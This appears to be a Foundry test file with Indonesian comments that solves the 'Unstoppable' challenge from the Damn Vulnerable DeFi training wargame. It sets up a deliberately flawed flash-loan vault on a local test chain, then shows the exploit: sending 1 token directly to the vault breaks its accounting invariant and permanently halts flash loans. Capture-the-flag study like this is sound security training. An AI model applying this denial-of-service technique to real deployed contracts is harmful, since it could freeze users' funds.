// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {UnstoppableVault} from "../src/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../src/UnstoppableMonitor.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract UnstoppableChallenge is Test {
    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    DamnValuableToken token;
    UnstoppableVault vault;
    UnstoppableMonitor monitor;

    function setUp() public {
        vm.startPrank(deployer);

        token = new DamnValuableToken();
        vault = new UnstoppableVault(ERC20(address(token)), deployer, deployer);

        // Deposit 1,000,000 DVT ke vault
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);

        // Deploy monitor + transfer ownership vault ke monitor
        monitor = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitor));

        // Player dapat 10 DVT
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        vm.stopPrank();
    }

    function _sanityLiveness() internal {
        // Monitor bisa flash loan sebelum attack
        vm.prank(deployer);
        monitor.checkFlashLoan(100e18);
    }

    function testSolve() public {
        // Sanity: sebelum attack, flash loan WORKS
        _sanityLiveness();
        assertEq(vault.owner(), address(monitor), "monitor masih own vault");

        // =============== EXPLOIT ===============
        // Cukup transfer 1 DVT langsung ke vault (bypass deposit()).
        // Ini merusak invariant: totalAssets naik, totalSupply tidak.
        // Berikut flashLoan() check `convertToShares(totalSupply) != balanceBefore` → revert PERMANEN.
        vm.prank(player);
        token.transfer(address(vault), 1);
        // =======================================

        // Monitor trigger flash loan check → gagal → transfer vault ownership ke deployer
        vm.prank(deployer);
        monitor.checkFlashLoan(100e18);

        // Verifikasi: vault di-pause (ownership berpindah = "paused" per monitor logic)
        assertEq(vault.owner(), deployer, "monitor handover ownership karena flashloan broken");

        // Verifikasi bonus: flash loan direct call juga revert
        vm.prank(player);
        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        vault.flashLoan(
            UnstoppableMonitor(address(monitor)),
            address(token),
            50e18,
            ""
        );

        console.log("Vault halted with 1 wei of DVT");
        console.log("Player DVT remaining:", token.balanceOf(player) / 1e18, "DVT");
    }
}
